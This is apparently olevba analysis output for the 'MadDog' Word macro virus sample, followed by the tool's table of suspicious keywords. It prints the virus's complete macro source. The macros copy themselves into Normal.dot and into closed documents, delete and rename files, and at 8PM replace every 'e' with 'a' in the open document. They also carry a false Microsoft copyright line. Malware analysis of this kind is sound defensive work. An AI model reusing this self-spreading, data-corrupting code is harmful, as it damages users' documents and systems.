olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Maddog
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AOpnFinish.bas 
in file: Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AOpnFinish'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim FullPath$
Dim CurrFile$
Rem  --------------------------------------------------------
Rem     Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
UserPath$ = WordBasic.[DefaultDir$](2)
FullPath$ = UserPath$ + "\Normal.dot"
CurrFile$ = WordBasic.[FileName$]()
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoOpen", Tab:=3
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="10", Password:="", WritePassword:="", RecommendReadOnly:=0
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExec.bas 
in file: Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Rem  --------------------------------------------------------
Rem       Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileClose.bas 
in file: Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/FileClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim WorkingPath$
Dim CurrFile$
Dim FullPath$
Dim Signature$
Dim TestSig$
Dim GetTestPath$
Dim TestPath
Dim Rover$
Dim StoreFile$
Rem  --------------------------------------------------------
Rem      Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
On Error GoTo -1: On Error GoTo BYE

If WordBasic.[FileNameFromWindow$]() = "" Then
GoTo EXIT_
Else
UserPath$ = WordBasic.[DefaultDir$](2)
WorkingPath$ = WordBasic.[DefaultDir$](0)
CurrFile$ = WordBasic.[FileNameFromWindow$]()
FullPath$ = UCase(UserPath$ + "\Normal.dot")
Signature$ = "AOpnFinish"
TestSig$ = UCase(WordBasic.[MacroFileName$](Signature$))
If TestSig$ = UCase(WordBasic.[FileNameFromWindow$]()) Then
GoTo EXIT_
Else
GoTo CONTINUE
End If
EXIT_:
WordBasic.FileClose
GoTo BYE
CONTINUE:
WordBasic.ToolsOptionsGeneral RecentFileCount:="0"
GetTestPath$ = WordBasic.[FileNameInfo$](WordBasic.[FileName$](), 5)
TestPath = Len(WorkingPath$)
If TestPath = 3 Then
GoTo VARSET1
Else
GoTo VARSET2
VARSET1:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "Temp.dot"
StoreFile$ = WorkingPath$ + "Filename.dat"
GoTo CORE
VARSET2:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "\Temp.dot"
StoreFile$ = WorkingPath$ + "\Filename.dat"
CORE:
Open StoreFile$ For Output As 1
Print #1, CurrFile$
Close 1
WordBasic.FileSave
WordBasic.FileSaveAs Name:=Rover$, Format:=1, AddToMru:=0
WordBasic.FileSave
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AOpnFinish", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AutoExec", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AutoOpen", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="AutoClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="FCFinish", Tab:=3
WordBasic.ToolsMacro Name:="FCFinish", Run:=1, Show:=1, Description:="", NewName:=""
Rem "above .show = 1 must be this value."
BYE:
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim B$
Dim C$
Dim XChg$
On Error GoTo -1: On Error GoTo BYE
B$ = WordBasic.[Left$](WordBasic.[Time$](), 1)
C$ = WordBasic.[Right$](WordBasic.[Time$](), 2)
XChg$ = B$ + C$
Rem MsgBox(B$ + C$)
If XChg$ = "8PM" Then
GoTo LASTRYTC
Else
End If
GoTo BYE
LASTRYTC:
WordBasic.EditReplace Find:="e", Replace:="a", Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
WordBasic.FileSave
BYE:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FCFinish.bas 
in file: Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/FCFinish'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim WorkingPath$
Dim GetTestPath$
Dim TestPath
Dim FullPath$
Dim Rover$
Dim StoreFile$
Dim OldFile$
Rem  --------------------------------------------------------
Rem       Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
On Error GoTo -1: On Error GoTo BYE
UserPath$ = WordBasic.[DefaultDir$](2)
WorkingPath$ = WordBasic.[DefaultDir$](0)
GetTestPath$ = WordBasic.[FileNameInfo$](WordBasic.[FileNameFromWindow$](), 5)
TestPath = Len(WorkingPath$)
If TestPath = 3 Then
GoTo VARSET1
Else
GoTo VARSET2
VARSET1:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "Temp.dot"
StoreFile$ = WorkingPath$ + "Filename.dat"
GoTo CORE
VARSET2:
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = WorkingPath$ + "\Temp.dot"
StoreFile$ = WorkingPath$ + "\Filename.dat"
CORE:
Open StoreFile$ For Input As 1
Input #1, OldFile$
Close 1
WordBasic.Organizer Copy:=1, Source:=FullPath$, Destination:=Rover$, Name:="FileClose", Tab:=3
WordBasic.FileSave
WordBasic.Kill OldFile$
WordBasic.Kill StoreFile$
WordBasic.FileClose
WordBasic.Rename Rover$, OldFile$
BYE:
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Maddog - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim UserPath$
Dim WorkingPath$
Dim FullPath$
Dim Rover$
Dim CurrFile$
Rem  --------------------------------------------------------
Rem       Microsoft Word for Windows 95 "MadDog" Macro Set
Rem                  v 1.0, March l996
Rem   --------------------------------------------------------
Rem       (c) Copyright Microsoft Corporation, 1995
On Error GoTo -1: On Error GoTo BYE:
UserPath$ = WordBasic.[DefaultDir$](2)
WorkingPath$ = WordBasic.[DefaultDir$](0)
FullPath$ = UserPath$ + "\Normal.dot"
Rover$ = UserPath$ + "\Temp.dot"
CurrFile$ = WordBasic.[FileName$]()
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AOpnFinish", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoExec", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="FileClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoClose", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="FCFinish", Tab:=3
WordBasic.Organizer Copy:=1, Source:=CurrFile$, Destination:=FullPath$, Name:="AutoOpen", Tab:=3
WordBasic.ToolsMacro Name:="AOpnFinish", Run:=1, Show:=0, Description:="", NewName:=""
BYE:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

